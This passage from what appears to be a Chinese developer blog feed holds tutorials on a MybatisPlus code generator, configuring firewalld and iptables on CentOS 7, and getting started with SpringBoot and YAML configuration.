生成的代码放在哪个包下</span></span><br><span class="line">		PackageConfig packageConfig = <span class="keyword">new</span> PackageConfig();</span><br><span class="line">		packageConfig.setParent(<span class="string">&quot;com.sangeng.mp.generator&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 包配置添加到 generator</span></span><br><span class="line">		generator.setPackageInfo(packageConfig);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 策略配置</span></span><br><span class="line">		StrategyConfig strategyConfig = <span class="keyword">new</span> StrategyConfig();</span><br><span class="line">		<span class="comment">// 下划线驼峰命名转换</span></span><br><span class="line">		strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">		strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">		<span class="comment">// 开启lombok</span></span><br><span class="line">		strategyConfig.setEntityLombokModel(<span class="keyword">true</span>);</span><br><span class="line">		<span class="comment">// 开启RestController</span></span><br><span class="line">		strategyConfig.setRestControllerStyle(<span class="keyword">true</span>);</span><br><span class="line">		generator.setStrategy(strategyConfig);</span><br><span class="line">		generator.setTemplateEngine(<span class="keyword">new</span> FreemarkerTemplateEngine());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始生成</span></span><br><span class="line">		generator.execute();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>MybatisPlus</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7防火墙配置</title>
    <url>/2021/01/13/centos7%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="CentOS7-防火墙设置"><a href="#CentOS7-防火墙设置" class="headerlink" title="CentOS7 防火墙设置"></a>CentOS7 防火墙设置</h2><p>阿里云centos7中默认使用firewall,并且默认没有开启。</p>
<p>使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置</p>
<h4 id="重启、关闭、开启firewalld服务"><a href="#重启、关闭、开启firewalld服务" class="headerlink" title="重启、关闭、开启firewalld服务"></a>重启、关闭、开启firewalld服务</h4><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><p>systemctl start firewalld</p>
<h5 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h5><p>systemctl enable firewalld</p>
<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><p>systemctl stop firewalld</p>
<h5 id="取消开机启动"><a href="#取消开机启动" class="headerlink" title="取消开机启动"></a>取消开机启动</h5><p>systemctl disable firewalld</p>
<h5 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h5><p>service firewalld restart</p>
<h5 id="查看firewall的状态"><a href="#查看firewall的状态" class="headerlink" title="查看firewall的状态"></a>查看firewall的状态</h5><p>firewall-cmd –state</p>
<h5 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h5><p>firewall-cmd –list-all</p>
<h5 id="用户配置目录"><a href="#用户配置目录" class="headerlink" title="用户配置目录"></a>用户配置目录</h5><p>cd /etc/firewalld/命令行方式</p>
<h5 id="常用的几个端口和配置语句"><a href="#常用的几个端口和配置语句" class="headerlink" title="常用的几个端口和配置语句"></a>常用的几个端口和配置语句</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="comment"># web**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=80/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># mysql**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=3306/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># tomcat**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=8080/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># redis**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=6379/tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="批量添加端口"><a href="#批量添加端口" class="headerlink" title="批量添加端口"></a>批量添加端口</h5><p>firewall-cmd –zone=public –permanent –add-port=8081-8200/tcp</p>
<h5 id="生成的配置文件所在路径"><a href="#生成的配置文件所在路径" class="headerlink" title="生成的配置文件所在路径"></a>生成的配置文件所在路径</h5><p>vi /etc/firewalld/zones/public.xml</p>
<h5 id="配置完成后重启"><a href="#配置完成后重启" class="headerlink" title="配置完成后重启"></a>配置完成后重启</h5><p>service firewalld restart配置文件方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">zone</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">short</span>&gt;</span>Public<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>For use in public areas.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;122.10.70.234&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;udp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;514&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;123.60.255.14&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;10050-10051&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;192.249.87.114&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;80&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;9527&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">zone</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>上面的对应的规则</code></p>
<p><code>固定IP 固定协议 的固定端口访问</code></p>
<p><code>固定IP 固定协议 的范围端口访问</code></p>
<p><code>固定IP 固定协议 的固定端口访问</code></p>
<p><code>任意IP 固定协议 的固定端口访问切换为iptables防火墙</code></p>
<p><code>关闭firewall：</code></p>
<h4 id="安装iptables防火墙"><a href="#安装iptables防火墙" class="headerlink" title="安装iptables防火墙"></a>安装iptables防火墙</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><code>yum install iptables-services</code></p>
<h5 id="开启iptables"><a href="#开启iptables" class="headerlink" title="开启iptables"></a>开启iptables</h5><p><code>service iptables restart</code></p>
<h5 id="设置防火墙开机启动"><a href="#设置防火墙开机启动" class="headerlink" title="设置防火墙开机启动"></a>设置防火墙开机启动</h5><p><code>systemctl enable iptables.service  或者chkconfig iptables on</code></p>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="查看已生效的规则"><a href="#查看已生效的规则" class="headerlink" title="查看已生效的规则"></a>查看已生效的规则</h5><p>iptables -L -n命令行方式</p>
<p><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT</code></p>
<h5 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h5><p><code>service iptables save</code></p>
<p>这样下次重启依旧会生效配置文件方式</p>
<h5 id="编辑iptables防火墙配置"><a href="#编辑iptables防火墙配置" class="headerlink" title="编辑iptables防火墙配置"></a>编辑iptables防火墙配置</h5><p>vi /etc/sysconfig/iptables</p>
<p>下边是一个完整的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Firewall configuration written by system-config-firewall</span><br><span class="line"></span><br><span class="line">Manual customization of this file is not recommended.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*filter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMIT</span><br></pre></td></tr></table></figure>

<p>保存退出</p>
<p>:wq!</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>centos</tag>
        <tag>firwall</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot初步学习</title>
    <url>/2022/02/01/SpringBoot%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-SpringBoot简介"><a href="#1-SpringBoot简介" class="headerlink" title="1. SpringBoot简介"></a>1. SpringBoot简介<span id="more"></span></h2><h3 id="1-1-为什么要学习SpringBoot"><a href="#1-1-为什么要学习SpringBoot" class="headerlink" title="1.1 为什么要学习SpringBoot"></a>1.1 为什么要学习SpringBoot</h3><p>​    SSM还是使用起来不够方便。</p>
<ul>
<li>还需要写很多的配置才能进行正常的使用。</li>
<li>实现一个功能需要引入很多的依赖，尤其是要自己去维护依赖的版本，特别容易出现依赖冲突等问题。</li>
</ul>
<p>​    SpringBoot就能很好的解决上述问题。</p>
<h3 id="1-2-SpringBoot是什么"><a href="#1-2-SpringBoot是什么" class="headerlink" title="1.2 SpringBoot是什么"></a>1.2 SpringBoot是什么</h3><p>​    Spring Boot是基于Spring开发的全新框架，相当于对Spring做了又一层封装。</p>
<p>​    其设计目的是用来简化Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。（自动配置）</p>
<p>​    并且对第三方依赖的添加也进行了封装简化。（起步依赖）</p>
<p>​    所以Spring能做的他都能做，并且简化了配置。</p>
<p>​    并且还提供了一些Spring所没有的比如：</p>
<ul>
<li><p>内嵌web容器，不再需要部署到web容器中</p>
<p>提供准备好的特性，如指标、健康检查和外部化配置 </p>
</li>
</ul>
<p>​    最大特点：<strong>自动配置</strong>、<strong>起步依赖</strong></p>
<p>​    官网：<a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></p>
<h2 id="2-快速入门"><a href="#2-快速入门" class="headerlink" title="2.快速入门"></a>2.快速入门</h2><h4 id="2-1清理Maven仓库脚本"><a href="#2-1清理Maven仓库脚本" class="headerlink" title="2.1清理Maven仓库脚本"></a>2.1清理Maven仓库脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem create by NettQun</span><br><span class="line">  </span><br><span class="line">rem 这里写你的仓库路径</span><br><span class="line">set REPOSITORY_PATH=E:\Develop\maven_rep</span><br><span class="line">rem 正在搜索...</span><br><span class="line">for /f &quot;delims=&quot; %%i in (&#x27;dir /b /s &quot;%REPOSITORY_PATH%\*lastUpdated*&quot;&#x27;) do (</span><br><span class="line">    echo %%i</span><br><span class="line">    del /s /q &quot;%%i&quot;</span><br><span class="line">)</span><br><span class="line">rem 搜索完毕</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>创建一个bat文件，然后复制上述脚本进去，修改其中maven本地仓库的地址，保存后双击执行即可。</p>
<h4 id="2-2HelloWorld程序"><a href="#2-2HelloWorld程序" class="headerlink" title="2.2HelloWorld程序"></a>2.2HelloWorld程序</h4><h5 id="继承父工程-添加依赖"><a href="#继承父工程-添加依赖" class="headerlink" title="继承父工程,添加依赖"></a>继承父工程,添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springBoot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="创建启动类"><a href="#创建启动类" class="headerlink" title="创建启动类"></a>创建启动类</h5><p>创建一个类并加上@SpringBootApplication注解标识为启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建controller包,新建helloController.java,和SpringMVC类似</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;HelloSpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动的时候不需要去配置Tomcat,直接启动刚才配置的启动类的main方法即可</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220201190334027.png" alt="image-20220201190334027"></p>
<h3 id="2-3-SpringBoot打包部署"><a href="#2-3-SpringBoot打包部署" class="headerlink" title="2.3 SpringBoot打包部署"></a>2.3 SpringBoot打包部署</h3><p>1.添加maven插件,pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.maven打包,运行package</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220201191519221.png" alt="image-20220201191519221"></p>
<p>找到对应target目录下生成的jar包</p>
<p>3.运行jar包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jar包路径</span><br></pre></td></tr></table></figure>

<h3 id="2-4-快速部署"><a href="#2-4-快速部署" class="headerlink" title="2.4 快速部署"></a>2.4 快速部署</h3><p>​    <a href="https://start.spring.io/">https://start.spring.io/</a></p>
<h2 id="3-起步依赖"><a href="#3-起步依赖" class="headerlink" title="3.起步依赖"></a>3.起步依赖</h2><p>​    SpringBoot依靠父项目中的版本锁定和starter机制让我们能更轻松的实现对依赖的管理。</p>
<h3 id="3-0-依赖冲突及其解决方案"><a href="#3-0-依赖冲突及其解决方案" class="headerlink" title="3.0 依赖冲突及其解决方案"></a>3.0 依赖冲突及其解决方案</h3><h4 id="3-0-1-依赖冲突"><a href="#3-0-1-依赖冲突" class="headerlink" title="3.0.1 依赖冲突"></a>3.0.1 依赖冲突</h4><p>​    一般程序在运行时发生类似于 java.lang.ClassNotFoundException，Method not found: ‘……’，或者莫名其妙的异常信息，这种情况一般很大可能就是 jar包依赖冲突的问题引起的了。</p>
<p>​    一般在是A依赖C(低版本)，B也依赖C(高版本)。 都是他们依赖的又是不同版本的C的时候会出现。</p>
<p>​    </p>
<h4 id="3-0-2-解决方案"><a href="#3-0-2-解决方案" class="headerlink" title="3.0.2 解决方案"></a>3.0.2 解决方案</h4><p>​    如果出现了类似于 java.lang.ClassNotFoundException，Method not found: 这些异常检查相关的依赖冲突问题，排除掉低版本的依赖，留下高版本的依赖。</p>
<p>​    </p>
<p>​    </p>
<h3 id="3-1-版本锁定"><a href="#3-1-版本锁定" class="headerlink" title="3.1 版本锁定"></a>3.1 版本锁定</h3><p>​    我们的SpringBoot模块都需要继承一个父工程：<strong>spring-boot-starter-parent</strong>。在spring-boot-starter-parent的父工程<strong>spring-boot-dependencies</strong>中对常用的依赖进行了版本锁定。这样我们在添加依赖时，很多时候都不需要添加依赖的版本号了。</p>
<p>​    </p>
<p>​    我们也可以采用覆盖properties配置或者直接指定版本号的方式修改依赖的版本。</p>
<p>例如：</p>
<p>直接指定版本号</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>覆盖properties配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aspectj.version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">aspectj.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-2-starter机制"><a href="#3-2-starter机制" class="headerlink" title="3.2 starter机制"></a>3.2 starter机制</h3><p>​    当我们需要使用某种功能时只需要引入对应的starter即可。一个starter针对一种特定的场景，其内部引入了该场景所需的依赖。这样我们就不需要单独引入多个依赖了。</p>
<p>​    命名规律</p>
<ul>
<li>官方starter都是以  <code>spring-boot-starter</code>开头后面跟上场景名称。例如：spring-boot-starter-data-jpa</li>
<li>非官方starter则是以 <code>场景名-spring-boot-starter</code>的格式，例如：mybatis-spring-boot-starter</li>
</ul>
<h2 id="4-自动配置"><a href="#4-自动配置" class="headerlink" title="4.自动配置"></a>4.自动配置</h2><p>​    SpringBoot中最重要的特性就是自动配置。</p>
<p>​    Springboot遵循“<strong>约定优于配置</strong>”的原则，自动进行了默认配置。这样我们就不需要做大量的配置。</p>
<p>​    当我们需要使用什么场景时，就会自动配置这个场景相关的配置。</p>
<p>​    如果他的默认配置不符合我们的需求时修改这部分配置即可。</p>
<h2 id="5-YML配置"><a href="#5-YML配置" class="headerlink" title="5.YML配置"></a>5.YML配置</h2><h3 id="5-1-简介"><a href="#5-1-简介" class="headerlink" title="5.1.简介"></a>5.1.简介</h3><h4 id="5-1-1YML是什么"><a href="#5-1-1YML是什么" class="headerlink" title="5.1.1YML是什么"></a>5.1.1YML是什么</h4><p>​        YAML (YAML Ain’t a Markup Language)YAML不是一种标记语言，通常以.yml为后缀的文件，是一种直观的能够被电脑识别的数据序列化格式，并且容易被人类阅读，容易和脚本语言交互的，可以被支持YAML库的不同的编程语言程序导入，一种专门用来写配置文件的语言。</p>
<p>​         YAML试图用一种比XML更敏捷的方式，来完成XML所完成的任务。</p>
<p>​         例如： </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">15</span></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>sangeng<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="5-1-2YML优点"><a href="#5-1-2YML优点" class="headerlink" title="5.1.2YML优点"></a>5.1.2YML优点</h4><ol>
<li><p>YAML易于人们阅读。</p>
</li>
<li><p>更加简洁明了</p>
</li>
</ol>
<h3 id="5-2-语法"><a href="#5-2-语法" class="headerlink" title="5.2.语法"></a>5.2.语法</h3><h4 id="5-2-1约定"><a href="#5-2-1约定" class="headerlink" title="5.2.1约定"></a>5.2.1约定</h4><ul>
<li><p>k: v 表示键值对关系，<strong>冒号后面必须有一个空格</strong></p>
</li>
<li><p>使用空格的缩进表示层级关系，空格数目不重要，<strong>只要是左对齐的一列数据，都是同一个层级的</strong></p>
</li>
<li><p>大小写敏感</p>
</li>
<li><p>缩进时<strong>不允许使用Tab键，只允许使用空格</strong>。(IDEA会帮忙替换tab为空格)</p>
</li>
<li><p><label style="background:yellow">java中对于驼峰命名法，可用原名或使用-代替驼峰，如java中的lastName属性,在yml中使用lastName或 last-name都可正确映射。</label></p>
</li>
<li><p>yml中注释前面要加#</p>
</li>
</ul>
<h4 id="5-2-2键值关系"><a href="#5-2-2键值关系" class="headerlink" title="5.2.2键值关系"></a>5.2.2键值关系</h4><h5 id="普通值-字面量"><a href="#普通值-字面量" class="headerlink" title="普通值(字面量)"></a>普通值(字面量)</h5><p>k: v：字面量直接写；</p>
<p>   字符串默认不用加上单引号或者双绰号；</p>
<p>   “”: 双引号；转义字符能够起作用</p>
<p>​       name:   “sangeng \n caotang”：输出；sangeng 换行  caotang</p>
<p>   ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name1:</span> <span class="string">sangeng</span> </span><br><span class="line"><span class="attr">name2:</span> <span class="string">&#x27;sangeng  \n caotang&#x27;</span></span><br><span class="line"><span class="attr">name3:</span> <span class="string">&quot;sangeng  \n caotang&quot;</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">flag:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h5 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h5><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/01/01</span></span><br></pre></td></tr></table></figure>



<h5 id="对象-属性和值-、Map-键值对"><a href="#对象-属性和值-、Map-键值对" class="headerlink" title="对象(属性和值)、Map(键值对)"></a>对象(属性和值)、Map(键值对)</h5><p>多行写法：</p>
<p>在下一行来写对象的属性和值的关系，注意缩进 </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>行内写法：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">zhangsan</span>,<span class="attr">age:</span> <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure>

<h5 id="数组、list、set"><a href="#数组、list、set" class="headerlink" title="数组、list、set"></a>数组、list、set</h5><p> 用- 值表示数组中的一个元素 </p>
<p>多行写法：</p>
